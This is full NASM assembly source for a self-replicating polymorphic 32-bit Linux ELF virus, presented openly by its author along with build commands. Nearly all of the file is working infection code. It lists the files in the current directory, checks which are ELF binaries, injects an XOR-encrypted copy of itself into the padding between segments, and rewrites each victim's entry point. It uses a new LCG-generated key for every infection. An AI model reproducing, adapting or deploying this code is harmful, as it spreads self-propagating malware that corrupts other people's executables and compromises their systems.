;####################################
;## A 32 bit Polymorphic ELF virus ##
;##           By S01den            ##
;####################################

; .____    .__       ________  ________     __________                         .___.__                   
; |    |   |__| ____ \_____  \ \_____  \    \______   \_______  ____  __ __  __| _/|  |__   ____   ____  
; |    |   |  |/    \  _(__  <  /  ____/     |     ___/\_  __ \/  _ \|  |  \/ __ | |  |  \ /  _ \ /    \ 
; |    |___|  |   |  \/       \/       \     |    |     |  | \(  <_> )  |  / /_/ | |   Y  (  <_> )   |  \
; |_______ \__|___|  /______  /\_______ \ /\ |____|     |__|   \____/|____/\____ | |___|  /\____/|___|  /
;         \/       \/       \/         \/ \/                                    \/      \/            \/

; Infection through segment padding infection + polymorphism. Made with love by S01den
; Can only infect binary with an executable stack, because polymorphism routine operates on the stakc...
; The encryption is just a simple xor, with a random key generated with a Linear Congruential Generator (LCG) for every new infection.

;#################################### USEFUL LINKS ####################################
;#  http://ivanlef0u.fr/repo/madchat/vxdevl/vxsrc/Linux/Linux.Cyneox/Linux.Cyneox.asm #
;#  http://ivanlef0u.fr/repo/madchat/vxdevl/vxsrc/Linux/Linux.Binom/Linux.Binom.asm   #
;#  http://shell-storm.org/shellcode/files/syscalls.html                              #
;######################################################################################

;nasm -f elf32 proudhon.asm && ld -m elf_i386 proudhon.o -o proudhon

;---------------------------------- CUT HERE ----------------------------------

; thoses variables concern the virus body, not the decipher loop

%define VIRSIZE 803
%define SIZE_DECIPHER 0x35
%define DELTA_CODE 0x2f1
%define RET_OEP VIRSIZE+SIZE_DECIPHER+3

; variables for the linear congruential generator (to generate a random key)
; same as C++11's minstd_rand

%define a_lcg 48271           
%define modulus_lcg 0x7fffffff

section .text
global _start

_start:

mov ecx, VIRSIZE
add ecx, 0x3f ; SIZE_DECIPHER+9
loop:
	call get_eip
	sub eax, 0xd
	mov esi, eax
	mov al, byte [esi+ecx-1]
	cmp ecx, 0x352                 ; because the code to jump into the OEP have to be plain
	jae set_byte
	cmp ecx, SIZE_DECIPHER         ; because this routine and get_eip have to be plain
	jbe set_byte
    xor al ,0x00
    set_byte:
    mov byte [esp+ecx-1], al
    dec ecx
    jnz loop
    add esp, SIZE_DECIPHER
    jmp esp

get_eip: 
	mov eax, [esp]
    ret

vx:    
add esp, VIRSIZE
add esp, SIZE_DECIPHER
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

mov edx, VIRSIZE
push edx      ; push the len of the virus on the stack
add esp, 0x20

getFiles:
	mov eax,183 ; pwd
	mov ebx,esp
	mov ecx,128
	int 0x80

	mov eax, 5 ; open
	mov ecx, 0
	mov edx, 0
	int 0x80

	cmp eax, 0
	jl exit

	mov ebx, eax ; getdents
	mov eax, 141
	mov edx, 1024

	push esp
	mov ecx, [esp] ; a little trick to save a spot on the stack

	int 0x80
	
	mov eax, 6 ; close
	int 0x80

	mov esp, ecx
	xor edi, edi
	xor ecx, ecx
	xor ebx, ebx
	mov esi, edx
	xor edx, edx

parse_dir:          ; a dump trick to get filenames from the previous getdents
		inc esp
		xor eax, eax
		cmp byte [esp], 0x00
		jne not_zero
		cmp ecx, 2			; if there are more than two successive printable bytes followed by a null byte, we consider the string a filename
		ja infect           ; so we try to infect it.

	not_zero:		
		mov bl, byte [esp]
		cmp bl, 0x20          ; check if the byte is printable
		jbe not_filename
		cmp bl, 0x7e
		jae not_filename
		inc ecx

	keep_parsing:
		inc edi
		cmp edi, 0x150
		jae exit
		jmp parse_dir

	not_filename:
		xor ebx, ebx
		xor ecx, ecx
		jmp keep_parsing

infect:
	mov ebx, ecx
	sub esp, ecx

	setFileName:
		mov eax, 5 ; open
		mov ebx, esp
		push ebp
		mov ebp, ecx
		mov ecx, 2 ; O_RW
		xor edx, edx
		int 0x80
		cmp eax, 0
		jl restore_esp

		push eax
		push eax

	stat: 
								     ; to get the length of the file to infect
		mov eax,106                  ; SYS_STAT
		sub esp,64                   
		mov ecx,esp
		int 0x80
			   
		mov edx,[esp+20]             ; edx = len of file to infect
		add esp,64                 
		
		pop ebx
		push edx
		add esp, 0x400
		mov eax, 3 ; read
		mov ecx, esp                 ; the stack now contains the whole content of the file we try to infect
		int 0x80

		cmp eax, 0
		jl parse_dir

	parse_file:
		push edx
		push edx
		push edx
		add esp, 0xc
		get_magic:
			cmp dword [esp], 0x464c457f   ; check if the file is an ELF
			je get_signature
			sub esp, 0x3f4
			call close
			call clean
			jmp parse_dir

		get_signature:
			xor ecx, ecx
			mov cx, word [esp+0x18] ; get e_phnum "Contains the number of entries in the program header table. "
			mov eax, dword [esp+0x1C] ; get e_phoff "Points to the start of the program header table." (which contains the segments infos)

			; for segment padding infection, we look at the space between the text and the data segment
		    mov ecx,[esp+eax+0x20*3+8]   ; get data vaddr
		    mov ebx,[esp+eax+0x20*2+16]	 ; get text size 	                                       
		    mov eax,[esp+eax+0x20*2+8]	 ; get text vaddr 						
		    add ebx, eax             ; ebx = text.vaddr+text.filesz		
	        sub ecx,ebx              ; data.p_vaddr - (text.p_filesz + text.p_vaddr)				

		    mov eax,VIRSIZE
		    cmp eax, ecx
		    ja no_room

			mov eax,[esp+0x18]         ;get entry point
			push eax

			add ebx, 15
			mov eax, dword [esp+0x1C+4]
			mov eax,[esp+eax+0x20*2+8+4]                 
			mov [esp+0x18+4], ebx        ; write the new EP (new entrypoint = text.p_filesz + text.p_vaddr)
			sub ebx, eax  	     		 ; get the offset of the new EP
			mov eax, ebx
			push eax
					
			add esp, eax
			mov esi, eax
			cmp dword [esp+7], 0x323b900 ; check if the bytes at the entry point are the same as in every file infected (0x323b900 = mov ecx,VIRSIZE). It's kind of a signature. 
			je already_infected

			; we put on the stack the code to return to the OEP
			mov byte [esp], 0xbd             ; -
			sub esp, eax                     ; | - Get the OEP from the stack and put it into ECX
			pop ebx                          ; | |
			pop ecx                          ; | |
			push ebx                         ; | |
			add esp, eax                     ; | |
			sub esp, 4                       ; | -
			mov [esp+1], ecx                 ; - mov ebp, OEP
			mov word [esp+5],0xe5ff          ; jmp ebp
			
			writeVirus:
	;####### insert the code to restore the OEP #######
			xor edx, edx
			mov ebx, 3
			mov ecx, eax
			mov eax, RET_OEP
			add ecx, eax
			mov eax, 19 ; lseek
			int 0x80

			mov ecx, esp 
			mov eax, 4 ; write
			mov edx, 7
			int 0x80

	;####### write the new EP #######
			xor edx, edx
			mov ecx, 0x18
			mov eax, 19
			int 0x80

			add esp, 8
			sub esp, esi
			mov ecx, esp
			add ecx, 0x18
			mov edx, 4
			mov eax, 4
			int 0x80

	;####### write the virus #######
			mov ebx, 3
			xor edx, edx
			mov ecx, esi
			mov eax, 19
			int 0x80

			call get_eip
			mov bl, byte [eax-0x1e2] ; get the current key
			push eax
			xor eax, eax
			mov al, bl

			; Linear Congruential Generator (I use this algorithm because it's an easy way to generate entropy)
			lcg:               
				inc al
				inc al
				mov ecx, a_lcg
				mul eax
				xor edx, edx
				mov ebx, modulus_lcg
				div ebx
				
				pop eax
				mov byte [eax-0x1e2], dl
			; edx now contains the remainder of the operation (X_n+1 = (aX_n+c) % modulus), so edx is the new key

			call clean

			get_decipher:        ; get the decipher routine (which contains the new key)
				call get_eip
				sub eax, 0x236
				mov cl, byte [eax+ebx]
				mov byte [esp+ebx], cl
				inc ebx
				cmp ebx, SIZE_DECIPHER
				jne get_decipher

			call clean
			jmp getVirus

			write_vx_code:
				call clean

				mov bl, byte [esp+0x24] ; get the key
				mov edx, VIRSIZE
				encrypt:            ; encrypt the virus body with the new key
					mov cl, byte [esp+SIZE_DECIPHER+eax]
					xor ecx, ebx
					mov byte [esp+SIZE_DECIPHER+eax], cl
					inc eax
					cmp eax, edx
					jne encrypt
				
				mov ecx, esp 
				mov ebx, 3
				mov edx, VIRSIZE
				add edx, SIZE_DECIPHER
				mov eax, 4
				int 0x80

				sub eax, SIZE_DECIPHER
				cmp eax, VIRSIZE
				jb exit

				ok_write:
					sub esp, 0x3f0
					call close
					call clean
	jmp parse_dir

no_room:
	sub esp, 0x3ee    ; to go back into the getdents content
	call close
	call clean
	jmp parse_dir

already_infected:
	sub esp, 0xa55     ; to go back into the getdents content
	call close
	call clean
	jmp parse_dir

exit: 
	call close
	call payload
	call clean
	call get_eip
	add eax, 0x7a     ; go to the restore OEP code
	jmp eax

clean:
	xor ecx, ecx
	xor ebx, ebx
	xor eax, eax
	xor edx, edx
	ret

close:
	mov eax, 6
	int 0x80 
	ret

payload:     ; just print a "hey"
	push 0
	push 0x796568
	mov ecx, esp
	mov eax, 4
	mov ebx, 1
	mov edx, 4
	int 0x80
	pop ecx
	pop edx
	call clean
	ret 

restore_esp:
	add esp, ebp
	pop ebp
	jmp parse_dir

getVirus:              ; a simple method I found which permits to get the whole virus code thanks to the current EIP
	call get_eip
	sub eax, DELTA_CODE
	mov cl, byte [eax+ebx]
	mov byte [esp+SIZE_DECIPHER+ebx], cl
	inc ebx
	cmp ebx, VIRSIZE
	jne getVirus
	call clean
	jmp write_vx_code

;--------------------------------------------------------------------------------------------------------------------------
